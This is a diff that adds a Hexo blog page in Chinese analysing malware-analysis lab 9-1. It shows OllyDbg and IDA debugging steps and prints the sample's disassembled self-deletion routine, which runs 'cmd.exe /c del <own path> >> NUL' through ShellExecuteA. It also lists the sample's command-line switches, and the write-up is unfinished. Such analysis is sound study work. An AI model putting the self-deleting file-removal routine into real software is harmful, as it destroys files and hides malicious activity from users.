@@ -1,0 +1,1111 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="纵观详细分析 打开程序观察堆栈发现并不是main函数入口点   利用ida分析main函数地址，并在od中断点     一步一步跟进调试   查看参数个数是否为1，继续向下直接call 401000    代码太长不好截图，直接放代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454">
+<meta property="og:type" content="article">
+<meta property="og:title" content="恶意代码分析lab9-1">
+<meta property="og:url" content="http://example.com/2022/08/06/lab9-1/index.html">
+<meta property="og:site_name" content="s1eep123のblog">
+<meta property="og:description" content="纵观详细分析 打开程序观察堆栈发现并不是main函数入口点   利用ida分析main函数地址，并在od中断点     一步一步跟进调试   查看参数个数是否为1，继续向下直接call 401000    代码太长不好截图，直接放代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824130648845.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824130710216.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824130728703.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824130742818.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824130755971.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824130811300.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824130821549.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824130926845.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825161450107.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824131207556.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824131130609.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825163746134.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824132407112.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824133448159.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824133644854.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824133848104.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824134418260.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824141400188.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824141515577.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824142219767.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824142336628.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825164520644.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825165228995.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825165810548.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825170308202.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825170611821.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825170736958.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824143845843.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825171533060.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825173245851.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825173545489.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825173934292.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825173828296.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825195723113.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825204505319.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825205048492.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825210040591.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825210313255.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825210515185.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825205316100.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825210834559.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825211222687.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825212325566.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825212923365.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825213434020.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825213657475.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825213749050.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825215514339.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825220021109.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825220103045.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825220208694.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825220353919.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825222101625.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825222744151.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825223222184.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220825223421058.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220826085643786.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220826091132206.png">
+<meta property="og:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220826092049031.png">
+<meta property="article:published_time" content="2022-08-06T13:16:50.000Z">
+<meta property="article:modified_time" content="2022-09-01T00:42:06.593Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="恶意代码">
+<meta property="article:tag" content="二进制">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/royal/AppData/Roaming/Typora/typora-user-images/image-20220824130648845.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>恶意代码分析lab9-1 · s1eep123&#39;s blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="s1eep123のblog" type="application/atom+xml">
+</head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>s1eep123's blog.</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">s1eep123&#39;s blog.</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">恶意代码分析lab9-1</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:30vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                恶意代码分析lab9-1
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="恶意代码">恶意代码</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="二进制">二进制</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2.9k</span>Reading time: <span class="post-count reading-time">14 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/08/06</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="纵观"><a href="#纵观" class="headerlink" title="纵观"></a>纵观</h2><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><ol>
+<li><p>打开程序观察堆栈发现并不是main函数入口点<br> <img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824130648845.png" alt="image-20220824130648845"></p>
+</li>
+<li><p>利用ida分析main函数地址，并在od中断点<br> <img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824130710216.png" alt="image-20220824130710216"><br>  <img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824130728703.png" alt="image-20220824130728703"></p>
+</li>
+<li><p>一步一步跟进调试<br> <img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824130742818.png" alt="image-20220824130742818"></p>
+</li>
+<li><p>查看参数个数是否为1，继续向下直接call 401000</p>
+<p> <img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824130755971.png" alt="image-20220824130755971"></p>
+</li>
+<li><p>代码太长不好截图，直接放代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">.text:00402410                 push    ebp</span><br><span class="line">.text:00402411                 mov     ebp, esp</span><br><span class="line">.text:00402413                 sub     esp, 208h</span><br><span class="line">.text:00402419                 push    ebx</span><br><span class="line">.text:0040241A                 push    esi</span><br><span class="line">.text:0040241B                 push    edi</span><br><span class="line">.text:0040241C                 push    104h            ; nSize</span><br><span class="line">.text:00402421                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:00402427                 push    eax             ; lpFilename</span><br><span class="line">.text:00402428                 push    0               ; hModule</span><br><span class="line">.text:0040242A                 call    ds:GetModuleFileNameA</span><br><span class="line">.text:00402430                 push    104h            ; cchBuffer</span><br><span class="line">.text:00402435                 lea     ecx, [ebp+Filename]</span><br><span class="line">.text:0040243B                 push    ecx             ; lpszShortPath</span><br><span class="line">.text:0040243C                 lea     edx, [ebp+Filename]</span><br><span class="line">.text:00402442                 push    edx             ; lpszLongPath</span><br><span class="line">.text:00402443                 call    ds:GetShortPathNameA</span><br><span class="line">.text:00402449                 mov     edi, offset aCDel ; &quot;/c del &quot;</span><br><span class="line">.text:0040244E                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:00402454                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402457                 xor     eax, eax</span><br><span class="line">.text:00402459                 repne scasb</span><br><span class="line">.text:0040245B                 not     ecx</span><br><span class="line">.text:0040245D                 sub     edi, ecx</span><br><span class="line">.text:0040245F                 mov     esi, edi</span><br><span class="line">.text:00402461                 mov     eax, ecx</span><br><span class="line">.text:00402463                 mov     edi, edx</span><br><span class="line">.text:00402465                 shr     ecx, 2</span><br><span class="line">.text:00402468                 rep movsd</span><br><span class="line">.text:0040246A                 mov     ecx, eax</span><br><span class="line">.text:0040246C                 and     ecx, 3</span><br><span class="line">.text:0040246F                 rep movsb</span><br><span class="line">.text:00402471                 lea     edi, [ebp+Filename]</span><br><span class="line">.text:00402477                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:0040247D                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402480                 xor     eax, eax</span><br><span class="line">.text:00402482                 repne scasb</span><br><span class="line">.text:00402484                 not     ecx</span><br><span class="line">.text:00402486                 sub     edi, ecx</span><br><span class="line">.text:00402488                 mov     esi, edi</span><br><span class="line">.text:0040248A                 mov     ebx, ecx</span><br><span class="line">.text:0040248C                 mov     edi, edx</span><br><span class="line">.text:0040248E                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402491                 xor     eax, eax</span><br><span class="line">.text:00402493                 repne scasb</span><br><span class="line">.text:00402495                 add     edi, 0FFFFFFFFh</span><br><span class="line">.text:00402498                 mov     ecx, ebx</span><br><span class="line">.text:0040249A                 shr     ecx, 2</span><br><span class="line">.text:0040249D                 rep movsd</span><br><span class="line">.text:0040249F                 mov     ecx, ebx</span><br><span class="line">.text:004024A1                 and     ecx, 3</span><br><span class="line">.text:004024A4                 rep movsb</span><br><span class="line">.text:004024A6                 mov     edi, offset aNul ; &quot; &gt;&gt; NUL&quot;</span><br><span class="line">.text:004024AB                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:004024B1                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:004024B4                 xor     eax, eax</span><br><span class="line">.text:004024B6                 repne scasb</span><br><span class="line">.text:004024B8                 not     ecx</span><br><span class="line">.text:004024BA                 sub     edi, ecx</span><br><span class="line">.text:004024BC                 mov     esi, edi</span><br><span class="line">.text:004024BE                 mov     ebx, ecx</span><br><span class="line">.text:004024C0                 mov     edi, edx</span><br><span class="line">.text:004024C2                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:004024C5                 xor     eax, eax</span><br><span class="line">.text:004024C7                 repne scasb</span><br><span class="line">.text:004024C9                 add     edi, 0FFFFFFFFh</span><br><span class="line">.text:004024CC                 mov     ecx, ebx</span><br><span class="line">.text:004024CE                 shr     ecx, 2</span><br><span class="line">.text:004024D1                 rep movsd</span><br><span class="line">.text:004024D3                 mov     ecx, ebx</span><br><span class="line">.text:004024D5                 and     ecx, 3</span><br><span class="line">.text:004024D8                 rep movsb</span><br><span class="line">.text:004024DA                 push    0               ; nShowCmd</span><br><span class="line">.text:004024DC                 push    0               ; lpDirectory</span><br><span class="line">.text:004024DE                 lea     eax, [ebp+Parameters]</span><br><span class="line">.text:004024E4                 push    eax             ; lpParameters</span><br><span class="line">.text:004024E5                 push    offset File     ; &quot;cmd.exe&quot;</span><br><span class="line">.text:004024EA                 push    0               ; lpOperation</span><br><span class="line">.text:004024EC                 push    0               ; hwnd</span><br><span class="line">.text:004024EE                 call    ds:ShellExecuteA</span><br><span class="line">.text:004024F4                 push    0               ; int</span><br><span class="line">.text:004024F6                 call    _exit</span><br><span class="line">.text:004024F6 sub_402410      endp</span><br></pre></td></tr></table></figure>
+<p>大体就是得到本地文件路径，拼凑字符串<br><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824130811300.png" alt="image-20220824130811300"><br>在本地尝试可以看到此命令为删除指定路径的文件(怪不得每次点击exe文件就没了，还以为防火墙删了emm)<br><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824130821549.png" alt="image-20220824130821549"><br>调用SHELL32的ShellExecute函数执行拼接的字符串，但由于已在od中打开，所以不会删除<br><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824130926845.png" alt="image-20220824130926845"><br>接着往下看，传入参数-in后call 40380f</p>
+</li>
+</ol>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825161450107.png" alt="image-20220825161450107"> </p>
+<p>在main函数中找到__mbscmp相关调用（call的40380f），此函数是比较字符串是否相等的</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824131207556.png" alt="image-20220824131207556"> </p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824131130609.png" alt="image-20220824131130609"> </p>
+<p>此函数（40380f）的返回值为910000</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825163746134.png" alt="image-20220825163746134">  </p>
+<p>可以看到参数-c -cc -re- in</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>地址</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-in</td>
+<td>.text:00402600</td>
+<td></td>
+</tr>
+<tr>
+<td>-c</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>-cc</td>
+<td>.text:0x401280</td>
+<td></td>
+</tr>
+<tr>
+<td>-re</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>接着往下看，添加-in参数后Ctrl+F2重新调试</p>
